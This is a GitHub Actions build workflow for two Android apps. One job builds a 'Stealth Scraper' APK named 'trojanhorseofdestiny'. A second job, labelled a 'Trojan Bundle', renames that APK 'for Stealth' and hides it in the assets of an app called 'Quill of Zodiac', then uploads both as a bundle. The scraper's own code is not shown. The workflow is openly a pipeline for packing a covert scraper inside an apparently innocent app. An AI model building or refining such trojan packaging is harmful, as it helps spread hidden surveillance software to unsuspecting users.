name: Build Hive-Network APKs

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build-scraper:
    name: Build Stealth Scraper (systeminternet)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      - name: Install Briefcase
        run: pip install briefcase

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Set up Android SDK
        uses: android-actions/setup-android@v3

      - name: Create Android project
        run: |
          cd mobile_app/system_internet
          briefcase create android --no-input

      - name: Build APK
        run: |
          cd mobile_app/system_internet
          briefcase build android --no-input

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: trojanhorseofdestiny-apk
          path: mobile_app/system_internet/build/trojanhorseofdestiny/android/gradle/app/build/outputs/apk/debug/*.apk

  build-trojan:
    name: Build Quill of Zodiac (Trojan Bundle)
    needs: build-scraper
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Download Scraper APK
        uses: actions/download-artifact@v4
        with:
          name: trojanhorseofdestiny-apk
          path: mobile_app/quill_dashboard/assets

      - name: Rename Scraper for Stealth
        run: |
          mkdir -p mobile_app/quill_dashboard/assets
          mv mobile_app/quill_dashboard/assets/*.apk mobile_app/quill_dashboard/assets/trojanhorseofdestiny.apk

      - name: Build Quill of Zodiac APK
        run: |
          cd mobile_app/quill_dashboard
          if [ -f gradlew ]; then
            chmod +x gradlew
            ./gradlew assembleDebug
          else
            echo "Gradle wrapper not found, skipping build"
          fi

      - name: Upload Final APKs
        uses: actions/upload-artifact@v4
        with:
          name: HiveWorks-Bundle
          path: |
            mobile_app/quill_dashboard/app/build/outputs/apk/debug/*.apk
            mobile_app/quill_dashboard/assets/trojanhorseofdestiny.apk

